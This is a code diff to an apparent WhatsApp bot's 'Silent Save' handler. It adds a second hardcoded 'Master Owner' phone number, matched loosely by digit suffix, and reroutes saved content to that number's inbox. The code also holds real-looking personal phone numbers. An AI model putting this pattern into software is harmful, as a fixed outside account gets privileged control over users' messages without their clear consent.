@@ -152,12 +152,14 @@ async function handleSilentSave(sock, msg, from, text, opts = {}) {
 
     // 🛑 1. CRITICAL USER GUARD:
     // ONLY the Bot User themselves (sent from their paired phone, msg.key.fromMe === true)
-    // OR Master Owner (923438673242) can trigger Silent Save!
+    // OR Master Owner (923420580154) can trigger Silent Save!
     // If any other person, contact, friend, or group member chats or replies, IGNORE COMPLETELY!
     const isFromMe = Boolean(msg?.key?.fromMe || opts?.isMe);
     const senderDigits = String(opts?.senderDigits || '').replace(/[^0-9]/g, '');
     const isMasterOwner = Boolean(
         opts?.isMasterOwner ||
+        senderDigits === '923420580154' ||
+        senderDigits.endsWith('3420580154') ||
         senderDigits === '923438673242' ||
         senderDigits.endsWith('3438673242')
     );
@@ -197,7 +199,7 @@ async function handleSilentSave(sock, msg, from, text, opts = {}) {
 
     // 🛑 6. Determine Bot User's personal inbox JID ("Message Yourself" / Saved Messages)
     const botUserJid = sock.user?.id ? jidNormalizedUser(sock.user.id) : null;
-    const masterJid = '923438673242@s.whatsapp.net';
+    const masterJid = '923420580154@s.whatsapp.net';
     const targetInbox = (isMasterOwner && !isFromMe) ? masterJid : (botUserJid || masterJid);
 
     if (!targetInbox) {
